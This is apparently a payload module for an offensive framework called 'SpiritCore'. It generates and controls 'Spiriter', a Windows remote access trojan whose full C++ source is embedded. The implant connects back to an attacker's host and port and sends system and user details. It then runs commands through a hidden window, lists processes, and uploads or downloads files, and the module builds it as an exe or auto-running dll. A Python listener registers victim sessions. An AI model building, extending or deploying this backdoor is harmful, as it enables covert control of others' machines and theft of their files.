# -*- coding: UTF-8 -*-
from SpiritCore.Payload import *
from SpiritCore.FCmd import *
from SpiritCore.Lib.Socket import *
import socket,uuid
from SpiritCore.Lib.Spiriter import *
from struct import pack,unpack
from SpiritCore.Lib.Build import *
import threading
from shutil import copyfile
SpiriterHeader = b"Spiriter"
SpiriterVersion=b"1.00"





EXE ="""

int main(int argc,char argv[]) {
	
	RAT Objecy;
	return 0;
}
"""
DLL="""

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    RAT Objecy;
    return TRUE;
}


"""

class Payloads(Payload):
    Info = {
        "Name": "Windows Spiriter ",
        "Author": "ZSD",
        "Description": "Spiriter RAT Backdoor",
        "Options": (
            ("LocalHost", "0.0.0.0", True, 'Command'),
            ("Port", "4444", True, 'Port'),
        )
    }
    Support=True
    OS=1
    Size=0
    SObject=None
    SessionObject=None
    Type="Spiriter"
    def GenerateFile(self,Parame,FilePath,FileType):
        if FileType in ["exe","dll"] :
            pass
        else:
            print_error("Error:Type support")
            return ""
        if FilePath=="":
            FilePath="shellcode"
        Object = CMAKE()
        try:
            Object.Filename=FilePath.split(".")[0]
        except:
            Object.Filename=FilePath
        Codes="""

#include<windows.h>
#include<cstdio>
#include<cmath>
#include <tlhelp32.h>
#include<vector>
#include<iostream>
#include <shlwapi.h>
using namespace std;

//Library Load
#pragma comment(lib,\"ws2_32.lib\")
#pragma comment(lib, \"shlwapi.lib\")


//Contral Code
#define BUFFER_SIZE		4124
#define SPIRITER_INIT	0x0
#define SPIRITER_PS		0x1
#define SPIRITER_EXEC	0x2
#define SPIRITER_UPLOAD 0x3
#define SPIRITER_DOWN	0x4



typedef struct RatRet {
	char Header[8];
	DWORD Command;
	DWORD DataSize;
	DWORD ToalLength;
	DWORD SendCount;
	DWORD ToalCount;
	char * Buffer;
}RetData, *PRetData;


typedef struct Rat{
	char Header[8];
	DWORD Command;
	DWORD DataSize;
	DWORD ToalLength;
	DWORD SendCount;
	DWORD ToalCount;
	char Buffer[4096];
}DataStruct,*PDataStruct;

typedef struct FileUpload {
	char Filename[260];
	DWORD FileSize;
}FileUpload,*PFileUpload;



class RAT
{
	
public:
	SOCKET Socket;
	RAT();
	~RAT();
	VOID ExecCode(RetData Ret);
	void EnumProcess();  
	BOOL Send(DWORD Commnad,char *Data, DWORD ToalLength);
	RetData Receive();
	BOOL PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwResultBufferSize);
	BOOL WriteFileA(RetData Ret);
	BOOL Download(RetData Ret);
private:

};


RAT::RAT()
{
	WORD SockVersion ;
	WSAData WsaData;
	sockaddr_in sockAddr;
	RetData Ret;
	SockVersion = MAKEWORD(2, 2);
	if (WSAStartup(SockVersion, &WsaData)!=0) {
		printf(\"ERROR\");
		exit(0);
	}
	this->Socket= socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	memset(&sockAddr, 0, sizeof(sockAddr));  
	sockAddr.sin_family = PF_INET;
	sockAddr.sin_addr.s_addr = inet_addr(\"IPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIP\");
	sockAddr.sin_port = htons(PORTPORTPORTPORTPORT);
	connect(this->Socket, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
	char Buffer[4096];
	memset(Buffer, 0, sizeof(Buffer));
	char PipeRel[2048];
	char whoami[1024];
	PipeCmd((char *)\"powershell -c \\\"Get-WmiObject Win32_OperatingSystem | Format-List BootDevice, BuildNumber, BuildType, Caption, CodeSet, CountryCode, CreationClassName, CSCreationClassName, CSDVersion, CSName, Description, Locale, Manufacturer, Name, Organization, OSArchitecture, OtherTypeDescription, PlusProductID, PlusVersionNumber, RegisteredUser, SerialNumber, Status, SystemDevice, SystemDirectory, SystemDrive, Version, WindowsDirectory\\\"\", PipeRel, 2048);
	PipeCmd((char*)\"whoami\", whoami, 1024);
	
	sprintf(Buffer,\"========================================System==========================\\n%s\\n=================Whoami==============================\\nwhoami%s\\n========================================\", PipeRel, whoami);
	Send(0x0, Buffer, strlen(Buffer));
	memset(Buffer, 0, sizeof(Buffer));
	while (true)
	{
		Ret = this->Receive();
		if (Ret.Command == SPIRITER_INIT) {
			Send(0x0, Buffer, sizeof(Buffer));
			continue;
		}
		else if (Ret.Command == SPIRITER_PS) {
			EnumProcess();

			continue;
		}
		else if (Ret.Command == SPIRITER_EXEC) {
			ExecCode(Ret);

		}
		else if (Ret.Command == SPIRITER_UPLOAD) {
			WriteFileA(Ret);
		}
		else if (Ret.Command == SPIRITER_DOWN) {
			Download(Ret);
		}
		
		free(Ret.Buffer);
		Ret.Buffer = NULL;

	}
	


	
}

RAT::~RAT()
{
	closesocket(this->Socket);
	WSACleanup();
}

/*
*  *****************************************************************************
*	Example:Send(ContralCode,Payload,PayloadLenght);
*		Send Payload or Data
*	@ContralCode:	SPIRITER Contral 
*		#define BUFFER_SIZE		4124
*		#define SPIRITER_INIT	0x0
*		#define SPIRITER_PS		0x1
*		#define SPIRITER_EXEC	0x2
*		#define SPIRITER_UPLOAD 0x3
*
*	@Payload:		Send Data
*	
*	@PayloadLenght:	Send DataLenght
*	 *****************************************************************************
*/
BOOL RAT::Send(DWORD Commnad, char* Data, DWORD ToalLength)
{
	/*
		该函数会把数据包进行切割，分为多个4096位的数据包一并发送到目标上。
		typedef struct RatRet {
			char Header[8];		4  协议头
			DWORD Command;		4  控制码
			DWORD DataSize;		4  本次数据包长度  
			DWORD ToalLength;	4  完整数据包长度
			DWORD SendCount;	4  发送的次数
			DWORD ToalCount;	4  完整发送次数
			char *Buffer;		x  存放数据缓冲区
		}RetData, *PRetData;
		程序会构造成以上的结构体为结构，主要是为了整体数据包不会有误差。

	*/
	char* Buffer = NULL;
	char Send[4124];
	int nCount = 0;
	int SendRet = 0;
	int SendLenght = 0;
	int SendCount=0;
	int SendedSize=0;
	PDataStruct Value;
	memset(&Send, 0, sizeof(Send));
	Value = (PDataStruct)&Send;
	memcpy(Value->Header, \"Spiriter\", sizeof(\"Spiriter\")); //设置协议头
	Value->ToalLength = ToalLength; //设置总长度
	Value->Command = Commnad; //设置ContralCode
	nCount = ToalLength / 4096; 
	//printf(\"\\nCount:%d\\n\", (nCount % 4096));
	if ((nCount % 4096) >= 0	and	(ToalLength   > 4096)) {
		nCount++;
	}
	else if(ToalLength<4096) {
		nCount++;
	}
	Value->ToalCount = nCount;
	//以上将数据包进行计算，计算出要发送次数。
	while (true)
	{
		SendCount++;
		Value->SendCount = SendCount;
		if (ToalLength - SendedSize <= 4096) {
			//最后一次发送，会对总长度进行校验，或者小于4096时直接进行此步。
			SendLenght= ToalLength - SendedSize;
			Value->DataSize = SendLenght;
			memcpy(Value->Buffer, Data + SendedSize, SendLenght);
			SendRet = send(Socket, Send, sizeof(Send), 0);
			SendedSize = SendedSize + SendLenght;
			if (SendRet == SendLenght+28) {
				if (SendedSize == Value->ToalLength) {
					printf(\"Sended:%d,ToalLength:%d\", SendedSize, ToalLength);
					return true;
				}
			}
			break;
			
		}
		else {
			//发送长度为4096数据包，并且进行计算。
			SendLenght = 4096;
			Value->DataSize = SendLenght;
			memcpy(Value->Buffer, Data + SendedSize, SendLenght);
			SendRet = send(Socket, Send, sizeof(Send), 0);
			if (SendRet == SendLenght+28) {
				SendedSize = SendedSize + 4096;
			}
			
		}
		
		
		
	}
	
	return 0;
}


/*
Example:Receive
	Receive Buffer or Data
	Return Struct 
		typedef struct RatRet {
			char Header[8];
			DWORD Command;
			DWORD DataSize;
			DWORD ToalLength;
			DWORD SendCount;
			DWORD ToalCount;
			char * Buffer;
		}RetData, *PRetData;

*/
RetData RAT::Receive()
{
	/*
		接受来自服务端的数据。
		会申请一块堆内存，并且数据以4096长度形式发送，会将其进行合并处理。
		并且判断长度是否有误差
	*/
	PRetData Ret;
	char* Buffer = NULL;
	char RecvBuffer[BUFFER_SIZE];
	Ret = (PRetData)RecvBuffer;
	int ToalLength = 0;
	int WriteLengt = 0;
	DWORD Count = 0;
	char Header[9];
	memset(&RecvBuffer, 0, sizeof(RecvBuffer));
	while (true)
	{
		Count++;
		memset(Header, 0, sizeof(Header));
		recv(this->Socket, RecvBuffer, BUFFER_SIZE, 0);
		memcpy(Header, Ret->Header, 8);
		if (Ret->DataSize > 4096) {
			ExitProcess(0);
		}
		if (strcmp(Header, \"Spiriter\") == 0) {
			if (Buffer == NULL) {//首次接收时，先进行内存申请。并且进行清0处理。
				ToalLength = Ret->ToalLength;
				Buffer = (char*)malloc(ToalLength);
				memset(Buffer, 0, ToalLength);
			}
			if(Count == Ret->SendCount){ //通过判断Count参数是否跟接收的发送次数一样。用来校验数据顺序准确。
				memcpy(Buffer + WriteLengt, RecvBuffer + 28, Ret->DataSize);
				WriteLengt = WriteLengt + Ret->DataSize;
			}
			else {
				Count = 0; ToalLength = 0;
				free(Buffer);
				Buffer = NULL;
				continue; //清空前面的数据。
			}
			if (ToalLength == WriteLengt && Count == Ret->SendCount ) {//通过判断长度和次数进行判断是否最后一组数据包
				Ret->Buffer = Buffer;
				return *Ret;
			}
			else {
				continue;
			}

		}
		else {
			continue;
		}



	}

	return *Ret;
}




/*
 *****************************************************************************
 *   功能区 
 * PipeCmd（命令执行核心）  WriteFileA（文件写入）  ExecCode（命令执行核心） EnumProcess（进程枚举）
 *****************************************************************************
 */


BOOL RAT::PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwResultBufferSize)
{
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	BOOL bRet = FALSE;
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	bRet = ::CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0);
	if (FALSE == bRet)
	{
		return FALSE;
	}
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	bRet = ::CreateProcessA(NULL, pszCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (FALSE == bRet)
	{
		printf(\"%d\\n\", GetLastError());
		printf(\"Error\");
	}
	::WaitForSingleObject(pi.hThread, INFINITE);
	::WaitForSingleObject(pi.hProcess, INFINITE);
	::RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
	::ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, NULL, NULL);
	::CloseHandle(pi.hThread);
	::CloseHandle(pi.hProcess);
	::CloseHandle(hWritePipe);
	::CloseHandle(hReadPipe);
	hWritePipe = NULL;

	hReadPipe = NULL;

	return TRUE;
}

BOOL RAT::WriteFileA(RetData Ret) {
	FileUpload FileInfo;
	memset(&FileInfo, 0, sizeof(FileUpload));
	memcpy(&FileInfo, Ret.Buffer, sizeof(FileUpload));
	char *WriteBuffer=(char *)malloc(FileInfo.FileSize);
	HANDLE FileObject=CreateFile(FileInfo.Filename,GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWrite;
	BOOL status = WriteFile(FileObject, Ret.Buffer + sizeof(FileUpload), FileInfo.FileSize, &dwWrite, NULL);
	free(WriteBuffer);
	WriteBuffer = NULL;
	CloseHandle(FileObject);
	char Buffer[4096];
	memset(Buffer, 0, sizeof(Buffer));
	if (status) {
		this->Send(0x0, Buffer, sizeof(Buffer));
	}
	else {
		DWORD ErrorCode = GetLastError();
		sprintf(Buffer, \"Error:%d\", ErrorCode);
		this->Send(0x3, Buffer, strlen(Buffer));
	}
	return TRUE;
}

BOOL RAT::Download(RetData Ret)
{
	FileUpload FileInfo; //使用FileUpload为下载请求结构。
	FileUpload Downloads;
	WIN32_FIND_DATA wfd;
	char Filename[MAX_PATH];
	DWORD FileLenght = 0;
	DWORD dwBytesRead = 0;
	char* Buffer = NULL;
	char* SendBuffer = NULL;
	memset(Filename, 0, sizeof(Filename));
	memset(&Downloads, 0, sizeof(Downloads));
	memset(&FileInfo, 0, sizeof(FileUpload));
	memcpy(&FileInfo, Ret.Buffer, sizeof(FileUpload));
	memcpy(Filename, FileInfo.Filename, sizeof(Filename));
	HANDLE hFind = FindFirstFile(FileInfo.Filename, &wfd);
	if (INVALID_HANDLE_VALUE != hFind){
		
		if (PathFileExists(Filename)) {
			HANDLE handle = CreateFile(Filename, GENERIC_READ, FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,       
				FILE_ATTRIBUTE_NORMAL,
				NULL);
			FileLenght = GetFileSize(handle, NULL);
			Buffer = (char*)malloc(FileLenght);
			SendBuffer = (char*)malloc(FileLenght + sizeof(FileUpload));

			memset(Buffer,0, FileLenght);
			memset(SendBuffer,0, FileLenght + sizeof(FileUpload));
			DWORD dwBytesToRead = FileLenght;
			dwBytesRead = 0;
			char *tmpBuf = Buffer;
			do {
				if (ReadFile(handle, tmpBuf, dwBytesToRead, &dwBytesRead, NULL)) {
					
				}
				else {
					DWORD ErrorCode= GetLastError();
					Send(ErrorCode,(char *)\"\\x00\", 1);
					return FALSE;
				}
			
			if (dwBytesRead == 0)
				break;

			dwBytesToRead -= dwBytesRead;
			tmpBuf += dwBytesRead;

			} while (dwBytesToRead > 0);
			strcpy(Downloads.Filename, Filename);
			Downloads.FileSize = FileLenght;
			memcpy(SendBuffer, &Downloads, sizeof(FileUpload));
			memcpy(SendBuffer + sizeof(FileUpload), Buffer, FileLenght);
			if(Send(0x0, SendBuffer, FileLenght + sizeof(FileUpload))) {
				
			}else {
				return FALSE;
			}
			Buffer = NULL;
			SendBuffer = NULL;
			CloseHandle(handle);
		}
		
	}
	else {
		Send(0x3, (char*)\"\\x00\",1);
		return FALSE;
	}

	//HANDLE handle = CreateFile(FileInfo.Filename, FILE_READ_EA,FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	return 0;
}

VOID RAT::ExecCode(RetData Ret)
{
	char Buffer[4096];
	memset(Buffer,0,sizeof(Buffer));
	PipeCmd(Ret.Buffer, Buffer, sizeof(Buffer));
	char* SendBuffer = (char *)malloc(strlen(Buffer));
	memset(SendBuffer,0, strlen(Buffer));
	memcpy(SendBuffer, Buffer, strlen(Buffer));
	Send(SPIRITER_EXEC, SendBuffer, strlen(Buffer));
	free(SendBuffer);
	SendBuffer = NULL;
	
}

void RAT::EnumProcess()
{
		vector<PROCESSENTRY32> vecProcess;
			HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap == INVALID_HANDLE_VALUE)
		{
			
			return;
		}
		PROCESSENTRY32 struProEntry32 = { 0 };
		struProEntry32.dwSize = sizeof(struProEntry32);
		BOOL bRes = Process32First(hSnap, &struProEntry32);
		int pNums = 0;
		while (bRes)
		{
			pNums++;
			vecProcess.push_back(struProEntry32);
			bRes = Process32Next(hSnap, &struProEntry32);
		}
		printf(\"Process Count:%d\\n\", vecProcess.size());
		DWORD SendLenth=0;
		SendLenth = vecProcess.size() *( MAX_PATH + 40);
		char* Buffer = (char *)malloc(SendLenth);
		memset(Buffer, 0, SendLenth);
		char Form[MAX_PATH + 40 - 1];
		int WriteOffset=0;
		for(int i{} ; i <= (vecProcess.size()-1);i++) {
			memset(Form, 0, sizeof(Form));
			sprintf(Form, \"%s		%d\\n\", vecProcess[i].szExeFile, vecProcess[i].th32ProcessID);
			memcpy(Buffer + WriteOffset, Form, strlen(Form));
			WriteOffset += strlen(Form);
		}
		//printf(\"%s\", Buffer);
		CloseHandle(hSnap);
		Send(0x1, Buffer, SendLenth / 2);
	

}
"""
        Object.CppCmakeLists+="""
target_link_libraries(%s wsock32 ws2_32)

target_link_libraries(%s shlwapi shlwapi)

if(CMAKE_BUILD_TOOL MATCHES "(msdev|devenv|nmake)")
    add_definitions(/W0)
endif()
        """%(Object.Filename,Object.Filename)
        if(FileType=="exe"):
            Codes+=EXE
            Object.Types="exe"
        elif FileType=="dll":
            Codes+=DLL
            Object.Types="dll"
        Codes=Codes.replace("IPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIPIP",self.Parameate["LocalHost"])
        Codes=Codes.replace("PORTPORTPORTPORTPORT",str(self.Parameate["Port"]))
        Object.SourceCode=Codes
        Filename=Object.Generate()
        if(Filename==""):
            print("Generate Error.....")
        else:
            print("Generate:%s"%FilePath)
            copyfile(Filename,FilePath)
    def Init(self):
        pass
    def SessionInfo(self):
        pass #return "%s:%s  <----- Hacker"%(self.Parameate['TargetIp'],self.Parameate['Port'])
    def Listen(self,Obj):
        WriteLogs("Listen Port%d"%self.Parameate["Port"])
        Sock =socket.socket()
        host = self.Parameate['LocalHost']
        port = int(self.Parameate['Port'])
        try:
            Sock.bind((host, port))
        except Exception as error:
            print_error("Listen error:%s"%error.__str__())
            return
        Sock.listen(1024)
        print_success("Listening %s:%d"%(host,port))
        L=ListenWaiter()
        L.init(self,Sock)
        self.SessionObject.ListThread=L
        self.SessionObject.ListThread.start()
        
    def Console(self,Sock):
        Sess = Spiriter()
        #write(Sock)
        #write(self.SessionObject.SpiriterSession[Sock])
        SessSock=Sock
        Sess.inti(SessSock)
        
class ListenWaiter(threading.Thread):
    LOCK=None
    def __init__(self):
        threading.Thread.__init__(self)
        try:
            self.lock=threading.Lock()
        except Exception as error:
            write(error) 

    def init(self,Object,Socket):
        self.Object=Object
        self.Socket=Socket
    def TrySession(self,Sock):
        TryData=Sock.recv(4096+28)
        if(TryData[:8]==b"Spiriter"):
            Version = TryData[8:8+4]
            Length=unpack("i",TryData[12:12+4])[0]
            ToalLength= unpack("i",TryData[16:16+4])[0]
            SendCount=unpack("i",TryData[20:20+4])[0]
            ToalCount=unpack("i",TryData[24:24+4])[0]
            return True
        
    def run(self):  #
        while True:
            c,addr = self.Socket.accept()
            print_success("New Session %s:%d <- %s:%d"%(self.Object.Parameate["LocalHost"],int(self.Object.Parameate["Port"]), str(addr[0]),addr[1]))
            if(self.TrySession(c)):
                UUID = uuid.uuid1().__str__()
                self.UUID = UUID
                print_success("UUID:%s   " % (UUID))
                self.Object.SObject.SessionManager.update({UUID: self.Object.SessionObject})
                self.Object.SObject.UsePayloadObject.SetUUidSession(UUID)
                self.Object.SObject.SessionManager[UUID].SessionInfo="Spiriter %s:%d"%( (addr[0]),addr[1])
                self.Object.SObject.SessionManager[UUID].UUID=UUID
                self.Object.SessionObject.SpiriterSession.update({UUID:c})